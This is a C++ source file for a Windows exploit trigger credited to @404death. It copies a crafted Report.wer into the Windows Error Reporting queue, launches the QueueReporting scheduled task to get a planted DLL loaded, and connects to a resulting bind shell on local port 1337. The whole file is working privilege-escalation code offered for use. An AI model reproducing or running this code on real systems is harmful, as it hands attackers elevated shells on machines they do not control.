// WerTrigger.cpp : Windows Error Reporting Trigger by @404death !
//
#include <iostream>
#include <strsafe.h>
#include <tchar.h>
#include "TcpClient.h"

#define BUFSIZE 4096

int wmain(int argc, wchar_t** argv)
{

	STARTUPINFO si;
	PROCESS_INFORMATION pi;

	ZeroMemory(&si, sizeof(STARTUPINFO));
	ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));

	si.cb = sizeof(STARTUPINFO);

//	return S_OK;

	wprintf_s(L"[+] Windows Error Reporting Trigger by @404death !\n");

	CreateDirectoryW(L"c:\\programdata\\microsoft\\windows\\wer\\reportqueue\\a_b_c_d_e", NULL);

	CopyFileW(L"Report.wer", L"c:\\programdata\\microsoft\\windows\\wer\\reportqueue\\a_b_c_d_e\\Report.wer", true);
	
	// submitting problem report with schtasks

	WCHAR cmdLine4[BUFSIZE]; 
	ZeroMemory(cmdLine4, BUFSIZE);
	StringCchCat(cmdLine4, BUFSIZE, L"cmd /c SCHTASKS /RUN /TN \"Microsoft\\Windows\\Windows Error Reporting\\QueueReporting\" > nul 2>&1");

	CreateProcess(nullptr, cmdLine4, nullptr, nullptr, FALSE, 0, nullptr, nullptr, &si, &pi);

	CloseHandle(pi.hThread);
	CloseHandle(pi.hProcess);

	Sleep(2000);

	// clean dir
	DeleteFileW(L"C:\\ProgramData\\Microsoft\\Windows\\WER\\ReportQueue\\a_b_c_d_e\\Report.wer");
	RemoveDirectoryW(L"C:\\ProgramData\\Microsoft\\Windows\\WER\\ReportQueue\\a_b_c_d_e");
	
	// TCP connecting

	TcpClient tcpClient;
	int iRes = 0;

	// Try to trigger DLL loading 
	wprintf_s(L"[+] Trigger launched.\n");
	wprintf_s(L"[*] TCP connecting...\n");

	// Wait a bit before trying to connect to the bind shell.
	//  
	wprintf_s(L"[*] Waiting for the DLL to be loaded...\n");

	Sleep(2000);

	iRes = tcpClient.connectTCP("127.0.0.1", "1337");

	if (iRes != 0)
	{
		wprintf_s(L"[*] Retrying ...\n");

		iRes = tcpClient.connectTCP("127.0.0.1", "1337");
	}

	if (iRes != 0)
	{
		wprintf_s(L"[*] Retrying ...\n");


		iRes = tcpClient.connectTCP("127.0.0.1", "1337");
	}

	if (iRes != 0)
	{
		wprintf_s(L"[-] Exploit failed.");
	}
	else
	{
		//	system("taskkill /F /IM rundll32.exe /T > NUL 2>&1");
		wprintf_s(L"[+] Exploit successfull.");
	}

	return 0;

}
